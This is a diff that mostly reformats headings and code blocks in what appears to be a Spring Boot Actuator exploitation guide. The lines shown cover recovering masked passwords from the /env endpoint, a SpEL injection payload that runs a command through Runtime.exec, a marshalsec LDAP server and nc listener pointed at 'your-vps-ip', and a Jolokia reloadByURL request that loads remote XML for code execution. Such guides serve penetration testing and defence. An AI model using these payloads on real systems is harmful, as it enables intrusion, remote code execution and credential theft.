@@ -153,7 +153,7 @@ Among them, the most important interfaces for finding vulnerabilities are:
 - `/trace`
   - Some http request packets access tracking information, it is possible to find valid cookie information
 
-### Obtain the Plaintext of the Password Desensitized by the Asterisk (method 1)
+### Password Desensitized by the Asterisk (method 1)
 
 When accessing the `/env` interface, the spring actuator will replace the attribute values ​​corresponding to some attribute names with sensitive keywords (such as password, secret) with * to achieve the effect of desensitization
 
@@ -217,7 +217,7 @@ Content-Type: application/json
 ```
 
 
-### Obtain the Plaintext of the Password Desensitized by the Asterisk (method 2)
+### Password Desensitized by the Asterisk (method 2)
 
 When accessing the `/env` interface, the spring actuator will replace the attribute values ​​corresponding to some attribute names with sensitive keywords (such as password, secret) with * to achieve the effect of desensitization
 
@@ -287,7 +287,7 @@ Authorization: Basic dmFsdWU6MTIzNDU2
 
 Decode the `dmFsdWU6MTIzNDU2` part of it using base64 to obtain a similar plaintext value `value:123456`, where `123456` is the plaintext of the attribute value before desensitization of the target asterisk*.
 
-### Obtain the Plaintext of the Password Desensitized by the Asterisk (method 3)
+### Password Desensitized by the Asterisk (method 3)
 
 When accessing the `/env` interface, the spring actuator will replace the attribute values ​​corresponding to some attribute names with sensitive keywords (such as password, secret) with * to achieve the effect of desensitization
 
@@ -370,7 +370,7 @@ Content-Type: application/json
 ```
 
 
-### Obtain the Plaintext of the Password Desensitized by the Asterisk (method 4)
+### Password Desensitized by the Asterisk (method 4)
 
 - When accessing the /env interface, the spring actuator will replace the attribute values ​​corresponding to some attribute names with sensitive keywords (such as password, secret) with * to achieve the effect of desensitization
 
@@ -393,8 +393,8 @@ Content-Type: application/json
 
 - Refer to the [article](https://landgrey.me/blog/16/) method, use the OQL statement of the [Eclipse Memory Analyzer](https://www.eclipse.org/mat/downloads.php) select * from org.springframework.web.context.support.StandardServletEnvironment tool to assist in fast filtering and analysis, and obtain the password plaintext
 
-Remote Code Execution
----------------------
+## Remote Code Execution
+
 
 Since spring boot related vulnerabilities may be caused by the combination of multiple component vulnerabilities, some vulnerabilities are not named properly, whichever can be distinguished
 
@@ -419,15 +419,15 @@ Convert from string format to 0x**java byte format for easy execution of arbitra
 # coding: utf-8result = ""target = 'open -a Calculator'for x in target:result += hex(ord(x)) + ","print(result.rstrip( ',' ))
 ```
 
-[](https://www.blogger.com/#)
 
-execute open -a Calculator command
 
-|
+execute `open -a Calculator` command
 
+
+```
 ${T(java.lang.Runtime).getRuntime().exec(new String(new byte[]{0x6f,0x70,0x65,0x6e,0x20,0x2d,0x61,0x20,0x43,0x61,0x6c,0x63,0x75,0x6c,0x61,0x74,0x6f,0x72}))}
+```
 
- |
 
 #### Vulnerability Principle:
 
@@ -455,11 +455,9 @@ http://127.0.0.1:9091/article?id=66 _
 
 Execute the open -a Calculatorcommand :
 
-|
-
+```
 http: //127.0.0.1:9091/article?id=${T(java.lang.Runtime).getRuntime().exec(new%20String(new%20byte[]{0x6f,0x70,0x65,0x6e,0x20 ,0x2d,0x61,0x20,0x43,0x61,0x6c,0x63,0x75,0x6c,0x61,0x74,0x6f,0x72}))}
-
- |
+```
 
 ### Spring Cloud SnakeYAML RCE
 
@@ -686,7 +684,9 @@ Download [marshalsec](https://github.com/mbechler/marshalsec) and use the foll
 
 |
 
+```bash
 java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer [http://your-vps-ip:80/](http://your-vps-ip/)#JNDIObject 1389
+```
 
  |
 
@@ -704,11 +704,9 @@ nc -lv 443
 
 Replacing the actual your-vps-ip address to access the URL triggers the vulnerability:
 
-|  |
-
+```
 /jolokia/exec/ch .qos .logback .classic :Name=default,Type=ch .qos .logback .classic .jmx .JMXConfigurator /reloadByURL/http:!/!/your-vps-ip!/example.xml
-
- |
+```
 
 [](https://www.blogger.com/#)
 
